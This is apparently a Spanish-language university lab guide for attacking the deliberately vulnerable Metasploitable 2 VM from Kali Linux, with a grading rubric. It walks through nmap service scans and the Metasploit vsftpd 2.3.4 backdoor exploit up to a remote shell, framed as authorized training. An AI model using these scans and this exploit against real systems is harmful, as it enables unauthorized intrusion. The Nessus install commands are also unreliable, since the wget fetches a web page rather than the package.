# Actividad-Metasploitable2-SEGINFO
# Guía de Laboratorio: Explotación de Vulnerabilidades en Metasploitable 2

## 🖥️ Herramientas Necesarias

### 1. Descargas

- **Metasploitable 2:**  
  URL: [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)
- **Kali Linux:**  
  URL: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
- **Tenable Nessus:**  
  URL: [https://www.tenable.com/downloads/nessus](https://www.tenable.com/downloads/nessus)
- **VMware Workstation Player:**  
  URL: [https://www.vmware.com/products/workstation-player.html](https://www.vmware.com/products/workstation-player.html)

### 2. Preparación del Entorno

#### Configuración de Máquinas Virtuales

1. Instalar **VMware Workstation Player**
2. Crear máquinas virtuales para:
   - Metasploitable 2
   - Kali Linux

#### Configuración de Red

1. Configurar **AMBAS** máquinas en modo **NAT**
2. Iniciar ambas máquinas
3. Verificar conectividad de red

## 3. Verificación de Conectividad

### Comandos de Prueba


# En Kali Linux
```bash
ping [IP_Metasploitable]
```

# En Metasploitable
```bash
ping [IP_Kali]
```

# Verificar interfaces de red

```bash
ifconfig
ip addr show
```

# 4. Escaneo de Vulnerabilidades
## Escaneo básico de servicios y versiones
```bash
nmap -sV -O [IP_Metasploitable]
```
## Escaneo más detallado
```bash
nmap -sV -p- -A [IP_Metasploitable]
```
Nessus (Opcional)
Instalar Nessus

## En Kali Linux
wget https://www.tenable.com/downloads/nessus
dpkg -i nessus.deb
systemctl start nessusd
Configurar escaneo web
Añadir IP de Metasploitable como objetivo

# 5. Explotación de VSFTPd
Metasploit Framework

# Abrir Metasploit
```bash
msfconsole
```



# Seleccionar y configurar exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
```bash
show options
```
```bash
set RHOSTS [IP_Metasploitable]
```

# Ejecutar exploit
exploit
Verificación de Acceso


# Una vez en sesión
```bash
whoami
pwd
mkdir [NombreEstudiante]
```

## 🛠️ Solución de Problemas Comunes
Errores Frecuentes

Conectividad de red,
Firewall bloqueando conexiones,
Configuraciones de red incorrectas,
Versiones incompatibles de software.

## 📊 Rubrica de Evaluación
Criterios de Calificación

### Configuración de red (20%)

Conectividad entre máquinas
Configuración correcta de red NAT


### Escaneo de Vulnerabilidades (25%)

Uso correcto de Nmap
Identificación de servicios
Detección de vulnerabilidades


### Explotación (30%)

Selección correcta de exploit
Ejecución exitosa
Acceso al sistema


### Documentación (15%)

Registro de pasos
Capturas de pantalla
Explicación de procesos


### Creatividad y Resolución de Problemas (10%)

Manejo de errores
Estrategias alternativas

## 🔒 Consideraciones de Seguridad
Lineamientos Importantes

Usar SOLO en entornos controlados

Obtener autorización antes de realizar pruebas

No usar en sistemas de producción

Respetar leyes de seguridad informática

La seguridad informática requiere ética y responsabilidad.
Estas herramientas son para aprendizaje y deben usarse con permiso.
